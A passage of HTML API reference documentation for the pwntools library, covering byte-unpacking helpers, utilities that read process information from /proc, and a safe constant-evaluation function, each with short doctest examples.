<p><cite>word_size</cite> can be any positive number or the string &#8220;all&#8221;. Choosing the
string &#8220;all&#8221; is equivalent to <code class="docutils literal"><span class="pre">len(data)*8</span></code>.</p>
<p>If <cite>word_size</cite> is not a multiple of 8, then the bits used for padding
are discarded.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>number</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; String to convert</li>
<li><strong>word_size</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Word size of the converted integer or the string &#8220;all&#8221;.</li>
<li><strong>endianness</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Endianness of the converted integer (&#8220;little&#8221;/&#8221;big&#8221;)</li>
<li><strong>sign</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Signedness of the converted integer (False/True)</li>
<li><strong>kwargs</strong> &#8211; Anything that can be passed to context.local</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The unpacked number.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xaa\x55</span><span class="s1">&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="kc">False</span><span class="p">))</span>
<span class="go">&#39;0x55aa&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xaa\x55</span><span class="s1">&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="kc">False</span><span class="p">))</span>
<span class="go">&#39;0xaa55&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xaa\x55</span><span class="s1">&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
<span class="go">&#39;-0x55ab&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xaa\x55</span><span class="s1">&#39;</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
<span class="go">&#39;0x2a55&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xff\x02\x03</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;all&#39;</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
<span class="go">&#39;0x302ff&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xff\x02\x03</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;all&#39;</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
<span class="go">&#39;-0xfdfd&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.packing.unpack_many">
<code class="descclassname">pwnlib.util.packing.</code><code class="descname">unpack_many</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/packing.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.packing.unpack_many" title="Permalink to this definition">¶</a></dt>
<dd><p>unpack(data, word_size = None, endianness = None, sign = None) -&gt; int list</p>
<p>Splits <cite>data</cite> into groups of <code class="docutils literal"><span class="pre">word_size//8</span></code> bytes and calls <a class="reference internal" href="#pwnlib.util.packing.unpack" title="pwnlib.util.packing.unpack"><code class="xref py py-func docutils literal"><span class="pre">unpack()</span></code></a> on each group.  Returns a list of the results.</p>
<p><cite>word_size</cite> must be a multiple of <cite>8</cite> or the string &#8220;all&#8221;.  In the latter case a singleton list will always be returned.</p>
<dl class="docutils">
<dt>Args</dt>
<dd>number (int): String to convert
word_size (int): Word size of the converted integers or the string &#8220;all&#8221;.
endianness (str): Endianness of the converted integer (&#8220;little&#8221;/&#8221;big&#8221;)
sign (str): Signedness of the converted integer (False/True)
kwargs: Anything that can be passed to context.local</dd>
</dl>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">The unpacked numbers.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">map</span><span class="p">(</span><span class="nb">hex</span><span class="p">,</span> <span class="n">unpack_many</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xaa\x55\xcc\x33</span><span class="s1">&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="kc">False</span><span class="p">))</span>
<span class="go">[&#39;0x55aa&#39;, &#39;0x33cc&#39;]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">map</span><span class="p">(</span><span class="nb">hex</span><span class="p">,</span> <span class="n">unpack_many</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xaa\x55\xcc\x33</span><span class="s1">&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="kc">False</span><span class="p">))</span>
<span class="go">[&#39;0xaa55&#39;, &#39;0xcc33&#39;]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">map</span><span class="p">(</span><span class="nb">hex</span><span class="p">,</span> <span class="n">unpack_many</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xaa\x55\xcc\x33</span><span class="s1">&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
<span class="go">[&#39;-0x55ab&#39;, &#39;-0x33cd&#39;]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">map</span><span class="p">(</span><span class="nb">hex</span><span class="p">,</span> <span class="n">unpack_many</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xff\x02\x03</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;all&#39;</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
<span class="go">[&#39;0x302ff&#39;]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">map</span><span class="p">(</span><span class="nb">hex</span><span class="p">,</span> <span class="n">unpack_many</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xff\x02\x03</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;all&#39;</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
<span class="go">[&#39;-0xfdfd&#39;]</span>
</pre></div>
</div>
</dd></dl>

</div>
<span id="document-util/proc"></span><div class="section" id="module-pwnlib.util.proc">
<span id="pwnlib-util-proc-working-with-proc"></span><h3><a class="reference internal" href="#module-pwnlib.util.proc" title="pwnlib.util.proc"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.proc</span></code></a> &#8212; Working with <code class="docutils literal"><span class="pre">/proc/</span></code><a class="headerlink" href="#module-pwnlib.util.proc" title="Permalink to this headline">¶</a></h3>
<dl class="function">
<dt id="pwnlib.util.proc.ancestors">
<code class="descclassname">pwnlib.util.proc.</code><code class="descname">ancestors</code><span class="sig-paren">(</span><em>pid</em><span class="sig-paren">)</span> &#x2192; int list<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/proc.py#L134-147"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.proc.ancestors" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>pid</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; PID of the process.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">List of PIDs of whose parent process is <cite>pid</cite> or an ancestor of <cite>pid</cite>.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.proc.children">
<code class="descclassname">pwnlib.util.proc.</code><code class="descname">children</code><span class="sig-paren">(</span><em>ppid</em><span class="sig-paren">)</span> &#x2192; int list<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/proc.py#L123-132"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.proc.children" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>pid</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; PID of the process.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">List of PIDs of whose parent process is <cite>pid</cite>.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.proc.cmdline">
<code class="descclassname">pwnlib.util.proc.</code><code class="descname">cmdline</code><span class="sig-paren">(</span><em>pid</em><span class="sig-paren">)</span> &#x2192; str list<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/proc.py#L194-203"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.proc.cmdline" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>pid</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; PID of the process.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">A list of the fields in <code class="docutils literal"><span class="pre">/proc/&lt;pid&gt;/cmdline</span></code>.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.proc.cwd">
<code class="descclassname">pwnlib.util.proc.</code><code class="descname">cwd</code><span class="sig-paren">(</span><em>pid</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/proc.py#L182-192"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.proc.cwd" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>pid</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; PID of the process.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">The path of the process&#8217;s current working directory. I.e. what
<code class="docutils literal"><span class="pre">/proc/&lt;pid&gt;/cwd</span></code> points to.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.proc.descendants">
<code class="descclassname">pwnlib.util.proc.</code><code class="descname">descendants</code><span class="sig-paren">(</span><em>pid</em><span class="sig-paren">)</span> &#x2192; dict<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/proc.py#L149-169"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.proc.descendants" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>pid</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; PID of the process.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">Dictionary mapping the PID of each child of <cite>pid</cite> to it&#8217;s descendants.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.proc.exe">
<code class="descclassname">pwnlib.util.proc.</code><code class="descname">exe</code><span class="sig-paren">(</span><em>pid</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/proc.py#L171-180"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.proc.exe" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>pid</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; PID of the process.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">The path of the binary of the process. I.e. what <code class="docutils literal"><span class="pre">/proc/&lt;pid&gt;/exe</span></code> points to.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.proc.name">
<code class="descclassname">pwnlib.util.proc.</code><code class="descname">name</code><span class="sig-paren">(</span><em>pid</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/proc.py#L92-106"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.proc.name" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>pid</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; PID of the process.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">Name of process as listed in <code class="docutils literal"><span class="pre">/proc/&lt;pid&gt;/status</span></code>.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">pid</span> <span class="o">=</span> <span class="n">pidof</span><span class="p">(</span><span class="s1">&#39;init&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">name</span><span class="p">(</span><span class="n">pid</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;init&#39;</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.proc.parent">
<code class="descclassname">pwnlib.util.proc.</code><code class="descname">parent</code><span class="sig-paren">(</span><em>pid</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/proc.py#L108-121"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.proc.parent" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>pid</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; PID of the process.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">Parent PID as listed in <code class="docutils literal"><span class="pre">/proc/&lt;pid&gt;/status</span></code> under <code class="docutils literal"><span class="pre">PPid</span></code>,
or 0 if there is not parent.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.proc.pid_by_name">
<code class="descclassname">pwnlib.util.proc.</code><code class="descname">pid_by_name</code><span class="sig-paren">(</span><em>name</em><span class="sig-paren">)</span> &#x2192; int list<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/proc.py#L61-90"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.proc.pid_by_name" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>name</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Name of program.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">List of PIDs matching <cite>name</cite> sorted by lifetime, youngest to oldest.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">os</span><span class="o">.</span><span class="n">getpid</span><span class="p">()</span> <span class="ow">in</span> <span class="n">pid_by_name</span><span class="p">(</span><span class="n">name</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getpid</span><span class="p">()))</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.proc.pidof">
<code class="descclassname">pwnlib.util.proc.</code><code class="descname">pidof</code><span class="sig-paren">(</span><em>target</em><span class="sig-paren">)</span> &#x2192; int list<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/proc.py#L16-59"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.proc.pidof" title="Permalink to this definition">¶</a></dt>
<dd><p>Get PID(s) of <cite>target</cite>.  The returned PID(s) depends on the type of <cite>target</cite>:</p>
<ul class="simple">
<li><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">str</span></code></a>: PIDs of all processes with a name matching <cite>target</cite>.</li>
<li><a class="reference internal" href="index.html#pwnlib.tubes.process.process" title="pwnlib.tubes.process.process"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.process.process</span></code></a>: singleton list of the PID of <cite>target</cite>.</li>
<li><a class="reference internal" href="index.html#pwnlib.tubes.sock.sock" title="pwnlib.tubes.sock.sock"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.sock.sock</span></code></a>: singleton list of the PID at the
remote end of <cite>target</cite> if it is running on the host.  Otherwise an
empty list.</li>
</ul>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>target</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#object" title="(in Python v2.7)"><em>object</em></a>) &#8211; The target whose PID(s) to find.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">A list of found PIDs.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.proc.starttime">
<code class="descclassname">pwnlib.util.proc.</code><code class="descname">starttime</code><span class="sig-paren">(</span><em>pid</em><span class="sig-paren">)</span> &#x2192; float<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/proc.py#L222-231"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.proc.starttime" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>pid</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; PID of the process.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">The time (in seconds) the process started after system boot</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.proc.stat">
<code class="descclassname">pwnlib.util.proc.</code><code class="descname">stat</code><span class="sig-paren">(</span><em>pid</em><span class="sig-paren">)</span> &#x2192; str list<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/proc.py#L205-220"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.proc.stat" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>pid</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; PID of the process.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">A list of the values in <code class="docutils literal"><span class="pre">/proc/&lt;pid&gt;/stat</span></code>, with the exception that <code class="docutils literal"><span class="pre">(</span></code> and <code class="docutils literal"><span class="pre">)</span></code> has been removed from around the process name.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.proc.state">
<code class="descclassname">pwnlib.util.proc.</code><code class="descname">state</code><span class="sig-paren">(</span><em>pid</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/proc.py#L275-288"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.proc.state" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>pid</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; PID of the process.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">State of the process as listed in <code class="docutils literal"><span class="pre">/proc/&lt;pid&gt;/status</span></code>.  See <cite>proc(5)</cite> for details.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">state</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getpid</span><span class="p">())</span>
<span class="go">&#39;R (running)&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.proc.status">
<code class="descclassname">pwnlib.util.proc.</code><code class="descname">status</code><span class="sig-paren">(</span><em>pid</em><span class="sig-paren">)</span> &#x2192; dict<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/proc.py#L233-257"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.proc.status" title="Permalink to this definition">¶</a></dt>
<dd><p>Get the status of a process.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>pid</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; PID of the process.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">The contents of <code class="docutils literal"><span class="pre">/proc/&lt;pid&gt;/status</span></code> as a dictionary.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.proc.tracer">
<code class="descclassname">pwnlib.util.proc.</code><code class="descname">tracer</code><span class="sig-paren">(</span><em>pid</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/proc.py#L259-273"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.proc.tracer" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>pid</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; PID of the process.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">PID of the process tracing <cite>pid</cite>, or None if no <cite>pid</cite> is not being traced.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">tracer</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getpid</span><span class="p">())</span> <span class="ow">is</span> <span class="kc">None</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.proc.wait_for_debugger">
<code class="descclassname">pwnlib.util.proc.</code><code class="descname">wait_for_debugger</code><span class="sig-paren">(</span><em>pid</em><span class="sig-paren">)</span> &#x2192; None<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/proc.py#L290-304"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.proc.wait_for_debugger" title="Permalink to this definition">¶</a></dt>
<dd><p>Sleeps until the process with PID <cite>pid</cite> is being traced.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>pid</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; PID of the process.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">None</td>
</tr>
</tbody>
</table>
</dd></dl>

</div>
<span id="document-util/safeeval"></span><div class="section" id="module-pwnlib.util.safeeval">
<span id="pwnlib-util-safeeval-safe-evaluation-of-python-code"></span><h3><a class="reference internal" href="#module-pwnlib.util.safeeval" title="pwnlib.util.safeeval"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.safeeval</span></code></a> &#8212; Safe evaluation of python code<a class="headerlink" href="#module-pwnlib.util.safeeval" title="Permalink to this headline">¶</a></h3>
<dl class="function">
<dt id="pwnlib.util.safeeval.const">
<code class="descclassname">pwnlib.util.safeeval.</code><code class="descname">const</code><span class="sig-paren">(</span><em>expression</em><span class="sig-paren">)</span> &#x2192; value<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/safeeval.py#L59-81"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.safeeval.const" title="Permalink to this definition">¶</a></dt>
<dd><p>Safe Python constant evaluation</p>
<p>Evaluates a string that contains an expression describing
a Python constant. Strings that are not valid Python expressions
or that contain other code besides the constant raise ValueError.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">const</span><span class="p">(</span><span class="s2">&quot;10&quot;</span><span class="p">)</span>
<span class="go">10</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">const</span><span class="p">(</span><span class="s2">&quot;[1,2, (3,4), {&#39;foo&#39;:&#39;bar&#39;}]&quot;</span><span class="p">)</span>
<span class="go">[1, 2, (3, 4), {&#39;foo&#39;: &#39;bar&#39;}]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">const</span><span class="p">(</span><span class="s2">&quot;[1]+[2]&quot;</span><span class="p">)</span>
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">ValueError</span>: <span class="n">opcode BINARY_ADD not allowed</span>
</pre></div>
</div>
</dd></dl>

